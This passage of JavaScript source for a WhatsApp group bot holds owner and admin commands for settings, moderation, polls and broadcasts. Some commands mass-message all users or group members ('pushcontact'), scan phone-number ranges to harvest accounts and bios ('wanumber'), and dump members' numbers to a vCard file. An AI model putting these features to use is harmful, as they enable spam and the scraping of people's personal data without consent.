                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autosticker = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                }
            break
            case 'autoblock':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcxeon(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcxeon(`Successfully Changed Auto-Block To ${q}`)
                }
            break
            case 'onlygroup':
            case 'onlygc':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcxeon(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcxeon(`Successfully Changed Onlygroup To ${q}`)
                }
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcxeon(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcxeon(`Successfully Changed Only-Pc To ${q}`)
                }
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    replygcxeon(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    replygcxeon(`Successfully Changed Only-Indian To ${q}`)
                }
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
                }
            break
            case 'self': {
                if (!XeonTheCreator) return XeonStickOwner()
                XeonBotInc.public = false
                replygcxeon('*Successful in Changing To Self Usage*')
            }
            break
            case 'public': {
                if (!XeonTheCreator) return XeonStickOwner()
                XeonBotInc.public = true
                replygcxeon('*Successful in Changing To Public Usage*')
            }
            break
            case 'mode':
                if (!XeonTheCreator) return XeonStickOwner()
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    XeonBotInc.public = true
                    replygcxeon(mess.done)
                } else if (q == 'self') {
                    XeonBotInc.public = false
                    replygcxeon(mess.done)
                }
            break
            case 'setexif':
            case 'setwm':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
                case 'setprefix':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.xprefix = text
                replygcxeon(`Prefix successfully changed to ${text}`)
                break
                case 'setautoblock':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.autoblocknumber = text
                replygcxeon(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.antiforeignnumber = text
                replygcxeon(`Anti-foreign number successfully changed to ${text}`)
                break
            case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'leave':
            case 'out':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!m.isGroup) return XeonStickGroup()
                replygcxeon('Bye Everyone 🥺')
                await XeonBotInc.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await XeonBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await XeonBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await XeonBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcxeon(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
            }
            break
            case 'pushcontact': {
    if (!XeonTheCreator) return XeonStickOwner()
      if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    XeonBotInc.sendMessage(pler, { text: q})
     }  
     replygcxeon(`Done`)
      }
      break
case 'pushcontactv2':{
if (!XeonTheCreator) return XeonStickOwner()
if (!q) return replygcxeon(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await XeonStickWait()
const metadata2 = await XeonBotInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
XeonBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcxeon(`Success`)
}
break
case 'block': case 'ban': {
		if (!XeonTheCreator) return XeonStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block')
		await replygcxeon(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!XeonTheCreator) return XeonStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock')
		await replygcxeon(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!XeonTheCreator) return XeonStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("XeonCheems10.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygcxeon(`${getCase(q)}`)
                } catch {
                  replygcxeon(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  replygcxeon(`${commad} is disabled`)
               }
               }
            break
            case 'react': {
                if (!XeonTheCreator) return XeonStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                XeonBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcxeon('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning on nsfw in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcxeon('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcxeon('Success in turning off nsfw in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'id':{
            replygcxeon(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'poll': {
	if (!XeonTheCreator) return XeonStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcxeon(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await XeonBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antiviewonce':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  replygcxeon(`${command} is disabled`)
               }
               }
            break
            case 'antilink': {
               if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return XeonStickGroup()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return XeonStickGroup()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  global.welcome = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  global.welcome = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return XeonStickGroup()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  adminevent = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
case 'groupevent': {
               if (!m.isGroup) return XeonStickGroup()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  groupevent = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break 
            case 'invite': {
	if (!m.isGroup) return XeonStickGroup()
	if (!isBotAdmins) return XeonStickBotAdmin()
if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await XeonBotInc.groupInviteCode(group)
      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcxeon(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcxeon(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcxeon(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
    if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
    if (!m.isGroup) return XeonStickGroup()
    if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
    if (!isBotAdmins) return XeonStickBotAdmin()
    
    let blockwww = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
            ? m.quoted.sender 
            : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (blockwww === botNumber) {
        return replygcxeon('*Maaf kamu tidak bisa kick bot.*\n*Karena dia pemilik grup ini.*')
    }

    await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
    replygcxeon(mess.done)
    break
                case 'idgroup': case 'groupid': {
if (!XeonTheCreator) return XeonStickOwner()
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcxeon(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcxeon(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await XeonBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await XeonBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcxeon(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return XeonStickGroup()
if (!(isGroupAdmins || XeonTheCreator)) return XeonStickAdmin()
xeonbigpp = await XeonBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
XeonBotInc.sendContact(m.chat, participants.map(a => a.id), xeonbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return XeonStickGroup()
if (!(isGroupAdmins || XeonTheCreator)) return XeonStickAdmin()
let cmiggc = await XeonBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcxeon('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
XeonBotInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return XeonStickGroup()
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XeonBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return XeonStickGroup()
if (!(isGroupAdmins || XeonTheCreator)) return XeonStickAdmin()
if (!m.mentionedJid[0]) return replygcxeon('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
XeonBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return XeonStickGroup()
                if(!XeonTheCreator) return XeonStickOwner()
                if (!isBotAdmins) return XeonStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygcxeon(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygcxeon(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygcxeon(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return XeonStickGroup()
                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (!text) return replygcxeon('Text ?')
                await XeonBotInc.groupUpdateSubject(m.chat, text)
                replygcxeon(mess.done)
                break
